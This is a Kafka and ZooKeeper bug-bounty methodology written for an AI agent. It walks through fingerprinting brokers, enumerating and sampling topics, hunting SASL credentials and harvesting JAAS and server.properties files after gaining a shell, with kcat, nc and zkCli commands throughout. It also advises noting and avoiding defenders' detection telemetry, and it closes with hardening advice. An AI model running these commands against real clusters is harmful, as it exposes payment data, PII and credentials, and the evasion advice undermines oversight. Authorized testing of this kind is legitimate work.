---
technology: "Apache Kafka"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
source: "field-grounded THIN (2 evidence files, fingerprint/adjacent-tier; see internal coverage ledger) + upstream-verified: kcat README (rename history, -L/-P/-C usage, -X config), IANA port registry (9092/tcp), Apache Kafka security docs (listeners/SASL), Kafka 4.0 ZooKeeper removal timelines, 2026-11-12 — every attack step below is upstream-derived; no field chain exists yet"
provenance: "corpus-grounded: 3 contributing writeups (internal coverage ledger, gate documented in header); upstream CVEs verified against primary sources during enrichment; basis of this page summarized from the unit ledger"
---

Companion page: [[kafka|Kafka overview]] — what the technology is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# Kafka Bug Bounty Methodology

**Scope:** Apache Kafka brokers (9092/tcp), legacy ZooKeeper co-services (2181/tcp), and the client-config surfaces (JAAS, properties files) reachable in an estate. **Out of scope:** Kafka Streams/Connect application bugs, managed-service control planes (report via the cloud program).

**Authorization:** presumes written permission. **DESTRUCTIVE** flags produce operations and anything touching consumer-group offsets on production — injected events flow into real downstream services; offset resets can reprocess or skip data. Enumerate before you consume, sample rather than dump, and never produce outside an explicitly permitted window.

**Honest-evidence note:** the evidence is fingerprint-tier only (a 9092 port table; a ZooKeeper log viewer). The workflow below is upstream-standard (kcat/Kafka docs); expected outputs are documented behavior, not field-observed.

## Decision tree (one screen)

1. 9092/tcp open, nmap says `XmlIpcRegSvc?`/unknown → Phase 1 (client fingerprint; the label is an IANA registrant, not Kafka).
2. Anonymous metadata works → Phase 2 (enumerate) → Phase 3 (consume sample) → report data exposure.
3. SASL handshake required → Phase 4 (credential hunt) → Phase 3 with auth.
4. 2181/tcp present → Phase 5 (ZooKeeper adjacency) in parallel.
5. Host shell obtained → Phase 6 (server.properties/JAAS harvest).

## Phase 1 — Fingerprinting (banners lie; clients don't)

```bash
nmap -p9092,2181 -sV 198.51.100.10        # expect 'XmlIpcRegSvc?' or tcpwrapped — Kafka is binary, banner-less
kcat -b 198.51.100.10:9092 -L             # metadata list: brokers, topics, partitions
```

Upstream facts: 9092/tcp's IANA registrant is `XmlIpcRegSvc` ("Xml-Ipc Server Reg", 2006) — **unrelated to Kafka**; nmap's label is noise (observed: exactly this line appears in a real port table). Kafka's own protocol has no banner: a successful `kcat -L` (metadata list mode, upstream README) IS the fingerprint. A TCP connect that immediately closes tells you auth-on or not-Kafka — the `-L` attempt disambiguates.

## Phase 2 — Enumeration (metadata)

```bash
kcat -b 198.51.100.10:9092 -L                       # cluster + topics + partitions
kcat -b 198.51.100.10:9092 -L -t 'payments*'       # per-topic detail
```

Anonymous success = PLAINTEXT listener without ACL enforcement (the default-est misconfiguration). Read topic names as an architecture map: `auth.*`, `payments`, `audit.*`, `user-events` rank the next phase. Kafka's own CLI (`kafka-topics.sh --bootstrap-server ... --list`) does the same from a distribution checkout; kcat is the non-JVM equivalent (upstream: "netcat for Kafka").

## Phase 3 — Data access (consume; produce only when authorized)

```bash
# sample the tail of a topic (bounded, non-destructive):
kcat -b 198.51.100.10:9092 -t payments -o end -e -c 20
# or: consume from beginning, limited count
kcat -b 198.51.100.10:9092 -t payments -o beginning -e -c 100
# balanced consumer-group read (>=0.9 brokers):
kcat -b 198.51.100.10:9092 -G examplegroup payments

# DESTRUCTIVE — produce an event (only under explicit authorization):
echo '{"type":"probe","src":"pentest"}' | kcat -P -b 198.51.100.10:9092 -t test-topic -p 0
```

Leak patterns to look for in the stream: raw credentials in event payloads (services emit them embarrassingly often), tokens/session ids, PII fields, and internal hostnames/stack traces. `-o end -e -c N` keeps you in the present tail (least intrusive); `-o beginning` reprocesses history (heavier — bound it). Reporting: sample messages + topic inventory + retention window = the exposure statement.

## Phase 4 — SASL/listener analysis when auth is on

Upstream-verified model: each listener maps to a security protocol via `listener.security.protocol.map` — `PLAINTEXT`, `SSL`, `SASL_PLAINTEXT`, `SASL_SSL`; SASL mechanisms: `GSSAPI` (Kerberos), `PLAIN`, `SCRAM-SHA-256/512`, `OAUTHBEARER`; inter-broker protocol **defaults to PLAINTEXT**.

```bash
# client-side SASL via librdkafka properties (kcat -X passes any librdkafka config, upstream README):
kcat -b 198.51.100.10:9092 -L \
  -X security.protocol=SASL_PLAINTEXT -X sasl.mechanisms=PLAIN \
  -X sasl.username='alice' -X sasl.password='alice-secret'
```

Credential sources for the hunt: `kafka_server_jaas.conf` / `client.properties` in repos and CI (upstream docs show the `user_<name>="secret"` JAAS shape — static, plaintext, harvestable), SCCM-style deploy shares, container env vars (`KAFKA_*`), and schemas in Schema Registry. Mechanism risk read: PLAIN = static secrets on disk; SCRAM = offline-crackable verifiers in ZK/broker storage; GSSAPI = ticket-side attacks ([[kerberos]]). Note `SASL_PLAINTEXT` authenticates but does not encrypt — on-path you still read the stream.

## Phase 5 — ZooKeeper adjacency (2181/tcp)

Pre-4.0 estates (ZooKeeper removed only in Kafka 4.0 — upstream-verified) run ZK beside the brokers:

```bash
echo dump | nc 198.51.100.10 2181       # 'dump' 4lw command: brokers + consumers (on open servers)
zkCli.sh -server 198.51.100.10:2181     # interactive; default installs accept unauthenticated sessions
# then: ls /brokers/ids ; ls /config/topics ; ls /kafka-acl (ACL znodes) ; ls /consumers
```

Unauthenticated ZK leaks broker membership, topic configs, and ACL state — and on misconfigured nodes allows config *writes* (DESTRUCTIVE). The four-letter-word commands (`dump`, `stat`, `ruok`) are the cheap probe; adjacent evidence shows the same class leaking through an internal log-viewer app when 2181 itself is firewalled.

## Phase 6 — Post-shell config harvest (any Kafka-adjacent host)

```
grep -rE 'listeners|advertised|security.protocol|sasl' /etc/kafka /opt/kafka*/config 2>/dev/null
cat /etc/kafka/kafka_server_jaas.conf /etc/kafka/server.properties
find / -name 'client.properties' -o -name '*jaas*' 2>/dev/null    # consumer/producer creds
```

`server.properties` answers the whole auth story in one file: `listeners=`, `listener.security.protocol.map=`, `sasl.enabled.mechanisms=`, plus JAAS paths. These configs also decide whether your Phase 2/3 results were the intended posture or an oversight — the difference between "informational" and "critical" in the report.

## Phase 7 — Defense and validation notes

- **Unauth data-plane finding:** `kcat -L` output + sampled messages from one sensitive topic; note retention (how long the exposure burns).
- **Credential finding:** the config file line (path + key) + proof of a working authenticated `-L`.
- **ZK finding:** the `dump` output or znode listing; never modify znodes in validation.
- **Detection telemetry defenders should have (note and avoid):** unknown-client metadata requests, consumer-group joins from new IPs, produce bursts, 2181 sessions from non-broker hosts, 4lw command usage.
- **Hardening for the report:** per-listener `SASL_SSL`, no PLAINTEXT listener on shared networks (and never as inter-broker default), SCRAM/OAUTHBEARER over static PLAIN users, ACLs per topic with least privilege, network-segment 9092/2181, ZK auth + 4lw whitelist (or KRaft migration to retire ZK), secret scanning for `client.properties`/JAAS in repos.

## Appendix A — Tooling (named in prose)

- **kcat** (formerly kafkacat, renamed Aug 2021 — upstream README) — non-JVM producer/consumer/metadata client: `-b` bootstrap, `-L` metadata list, `-t`/`-p` topic/partition, `-P` produce, `-G` balanced group, `-o` offsets, `-c` message cap, `-X property=value` for any librdkafka config (SASL/SSL).
- **Apache Kafka CLI scripts** — `kafka-topics.sh`, `kafka-console-producer.sh`, `kafka-console-consumer.sh` with `--bootstrap-server` — the JVM-native equivalents shipped in every distribution.
- **zkCli.sh** (ZooKeeper) — interactive znode access; four-letter commands (`dump`, `stat`) over nc for cheap probes.
- **nmap** — port truth for 9092/2181 despite misleading `XmlIpcRegSvc` service labels (verified IANA fact).
- References: kcat README, Apache Kafka security documentation, Confluent/Conduktor KRaft timelines (all upstream-verified for this page).

## Appendix B — Quick reference

```bash
# fingerprint + metadata (auth probe in one)
kcat -b 198.51.100.10:9092 -L
# sample tail of a topic
kcat -b 198.51.100.10:9092 -t payments -o end -e -c 20
# SASL client
kcat -b 198.51.100.10:9092 -L -X security.protocol=SASL_PLAINTEXT -X sasl.mechanisms=PLAIN \
  -X sasl.username=alice -X sasl.password=alice-secret
# zookeeper adjacency
echo dump | nc 198.51.100.10 2181 ; zkCli.sh -server 198.51.100.10:2181
# post-shell
grep -rE 'listeners=|security.protocol|sasl' /etc/kafka /opt/kafka*/config
```
